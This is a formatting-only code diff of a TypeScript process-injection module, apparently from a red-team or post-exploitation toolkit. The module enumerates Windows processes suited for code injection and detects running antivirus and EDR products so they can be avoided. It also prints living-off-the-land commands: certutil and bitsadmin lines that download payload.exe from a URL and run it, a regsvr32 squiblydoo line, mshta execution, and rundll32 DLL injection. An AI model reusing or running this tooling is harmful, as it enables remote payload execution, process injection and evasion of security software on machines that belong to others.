@@ -15,10 +15,19 @@ export async function processInject(args: string[], timeout: number): Promise<Ho
     if (action === "enum") {
       output.push("=== Injectable Process Discovery ===")
       const tasklist = await cmd("tasklist /v /fo csv", timeout)
-      const highValue = ["explorer.exe", "svchost.exe", "RuntimeBroker.exe", "taskhostw.exe", "sihost.exe", "ctfmon.exe", "dllhost.exe", "SearchHost.exe"]
+      const highValue = [
+        "explorer.exe",
+        "svchost.exe",
+        "RuntimeBroker.exe",
+        "taskhostw.exe",
+        "sihost.exe",
+        "ctfmon.exe",
+        "dllhost.exe",
+        "SearchHost.exe",
+      ]
       output.push("[*] High-value injection targets:")
       for (const hv of highValue) {
-        const match = tasklist.stdout.split("\n").filter(l => l.toLowerCase().includes(hv.toLowerCase()))
+        const match = tasklist.stdout.split("\n").filter((l) => l.toLowerCase().includes(hv.toLowerCase()))
         if (match.length > 0) {
           const pid = match[0].split(",")[1]?.replace(/"/g, "")
           const mem = match[0].split(",")[4]?.replace(/"/g, "")
@@ -26,26 +35,44 @@ export async function processInject(args: string[], timeout: number): Promise<Ho
         }
       }
       output.push("\n[*] User-mode processes (same session):")
-      const userProcs = await cmd("tasklist /fi \"sessionname eq Console\" /fo csv /nh", timeout)
+      const userProcs = await cmd('tasklist /fi "sessionname eq Console" /fo csv /nh', timeout)
       const lines = userProcs.stdout.trim().split("\n").filter(Boolean).slice(0, 20)
       for (const l of lines) {
-        const parts = l.split(",").map(p => p.replace(/"/g, ""))
+        const parts = l.split(",").map((p) => p.replace(/"/g, ""))
         output.push(`    ${parts[0]} PID:${parts[1]} Mem:${parts[4]}`)
       }
       output.push("\n[*] Security products (avoid injecting into):")
-      const avProcs = ["MsMpEng.exe", "MsSense.exe", "SenseNdr.exe", "csfalconservice.exe", "cb.exe", "CylanceSvc.exe", "SentinelAgent.exe", "bdservicehost.exe"]
+      const avProcs = [
+        "MsMpEng.exe",
+        "MsSense.exe",
+        "SenseNdr.exe",
+        "csfalconservice.exe",
+        "cb.exe",
+        "CylanceSvc.exe",
+        "SentinelAgent.exe",
+        "bdservicehost.exe",
+      ]
       for (const av of avProcs) {
         const check = await cmd(`tasklist /fi "imagename eq ${av}" /nh 2>nul`, timeout)
         if (check.stdout.includes(av)) output.push(`    [!] ${av} RUNNING — DO NOT inject`)
       }
-      findings.push({ checkId: "WIN-INJECT-001", provider: "windows", severity: "info", status: "ENUMERATED", resource: "process://injection-targets", title: "Injectable process discovery via tasklist", details: "High-value targets and AV processes enumerated", remediation: "Enable process protection. Monitor for unusual DLL loads." })
+      findings.push({
+        checkId: "WIN-INJECT-001",
+        provider: "windows",
+        severity: "info",
+        status: "ENUMERATED",
+        resource: "process://injection-targets",
+        title: "Injectable process discovery via tasklist",
+        details: "High-value targets and AV processes enumerated",
+        remediation: "Enable process protection. Monitor for unusual DLL loads.",
+      })
     }
     if (action === "hollow" || action === "apc" || action === "hijack" || action === "earlybird") {
       output.push(`[!] ${action} injection requires Win32 API P/Invoke (PS/.NET only)`)
       output.push("[*] cmd.exe alternatives for code execution:")
       output.push("    rundll32.exe <dll>,<entry>  (DLL sideloading)")
       output.push("    regsvr32 /s /n /u /i:<url> scrobj.dll  (squiblydoo)")
-      output.push("    mshta vbscript:Execute(\"...\")  (HTA execution)")
+      output.push('    mshta vbscript:Execute("...")  (HTA execution)')
       output.push("    certutil -urlcache -split -f <url> payload.exe && payload.exe")
       output.push("    bitsadmin /transfer job /download /priority high <url> payload.exe")
       if (target) {
@@ -54,7 +81,10 @@ export async function processInject(args: string[], timeout: number): Promise<Ho
       }
     }
     if (action === "dll") {
-      if (!dll) { output.push("[!] Required: --dll <path>"); return { output: output.join("\n"), findings } }
+      if (!dll) {
+        output.push("[!] Required: --dll <path>")
+        return { output: output.join("\n"), findings }
+      }
       output.push(`[*] DLL injection via rundll32:`)
       output.push(`    rundll32.exe "${dll}",DllMain`)
       output.push(`    regsvr32 /s "${dll}"`)
